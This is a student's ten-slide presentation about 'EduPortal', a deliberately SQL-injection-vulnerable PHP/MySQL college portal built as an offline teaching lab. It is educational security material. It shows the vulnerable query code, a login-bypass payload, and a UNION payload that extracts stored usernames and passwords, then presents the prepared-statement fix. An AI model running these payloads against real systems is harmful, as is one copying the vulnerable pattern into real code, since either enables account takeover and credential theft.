# EduPortal - Presentation (10 Slides)

Educational Student Management Portal
**Mohd Yasin Kazi** - TY B.Sc. Computer Science

---

## Slide 1 - Title

# EduPortal
### Educational Student Management Portal
A Classroom Laboratory for Demonstrating SQL Injection

**Mohd Yasin Kazi** | TY B.Sc. Computer Science

---

## Slide 2 - Problem

# Web Applications & Databases

- Most web apps store data in databases (MySQL).
- Developers often build SQL by concatenating user input:

```php
"SELECT * FROM users WHERE username = '$username'"
```

- If input is not validated/escaped, the attacker can **rewrite the SQL**.
- This is **SQL Injection** - a permanent member of the OWASP Top 10.

---

## Slide 3 - Objective

# Project Objective

Build a **realistic college portal** that is **intentionally vulnerable** to SQL Injection so students can:

1. See user input flow into a SQL query.
2. Craft and run real injection payloads safely.
3. Observe the impact (login bypass, data extraction).
4. Learn the fix - prepared statements.

---

## Slide 4 - Tech Stack

# Technology Stack

| Layer     | Technology                |
|-----------|---------------------------|
| Frontend  | HTML5, CSS3, Bootstrap 5, JS |
| Backend   | PHP 8                     |
| Database  | MySQL                     |
| Server    | XAMPP (Apache + MySQL)    |
| Icons     | Bootstrap Icons           |

Runs **100% offline** on localhost.

---

## Slide 5 - Features / Pages

# Portal Features

- Home / About / Courses / Faculty / Contact
- **Student Login** & **Admin Login**
- **Student Search** (by Roll Number)
- **Result Portal** (marks, percentage, grade)
- **Student Dashboard** & **Admin Dashboard**

Every page feels like a real university ERP - white UI, blue theme, responsive.

---

## Slide 6 - Database Design

# Database (eduportal)

5 tables, fully seeded:

| Table   | Rows | Purpose            |
|---------|------|--------------------|
| students| 22   | Student records    |
| admins  | 5    | Admin users        |
| courses | 6    | Programmes         |
| faculty | 5    | Faculty directory  |
| results | 81   | Marks & grades     |

Relationships: courses 1->* students 1->* results

---

## Slide 7 - Vulnerable Code

# The Vulnerable Pattern

```php
$sql = "SELECT * FROM students
        WHERE username = '" . $username . "'
        AND password = '" . $password . "'";

$result = mysqli_query($conn, $sql);
```

- No prepared statements.
- No `mysqli_real_escape_string`.
- No parameterisation - anywhere in the app.

---

## Slide 8 - Attack 1: Login Bypass

# Demo: Login Bypass

Password field:
```
' OR '1'='1
```

Becomes:
```sql
WHERE username='x' AND password='' OR '1'='1'
-- (always true) -> login as first student
```

**Comment variant:**
```
username = ' OR '1'='1' -- 
```
The `--` comments out the password check.

---

## Slide 9 - Attack 2: UNION Extraction

# Demo: UNION-Based Data Extraction

Result Portal, Roll Number field:
```
BCS2026-001' UNION SELECT id, username, password,
1, 2, 3.50, 'A', 'Exam', semester FROM students WHERE '1'='1
```

- Appends `students` rows to the `results` output.
- **Leaks every username & password** through the result table.

Lesson: input must never become SQL structure.

---

## Slide 10 - The Fix & Conclusion

# The Fix & Conclusion

**Secure code (prepared statements):**
```php
$stmt = $conn->prepare(
  "SELECT * FROM students WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

**Conclusion:** EduPortal is a safe, realistic lab that turns SQL Injection from theory into a hands-on lesson - and shows exactly how to prevent it.

> **WARNING:** intentionally vulnerable - educational use only, never deploy publicly.
